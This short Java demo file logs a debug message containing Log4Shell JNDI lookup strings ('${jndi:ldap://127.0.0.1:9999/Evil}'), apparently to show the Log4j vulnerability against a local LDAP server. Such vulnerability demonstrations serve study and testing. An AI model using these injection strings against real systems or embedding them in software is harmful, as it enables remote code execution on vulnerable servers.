package org.vilojona.demo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Main {
    private static final Logger log = LogManager.getLogger(Main.class);
  public static void main(String[] args) {
    log.debug("Log4j debugging $ {jndi:ldap://localhost:9999/Evil} : ${jndi:ldap://127.0.0.1:9999/Evil}");
  }
}
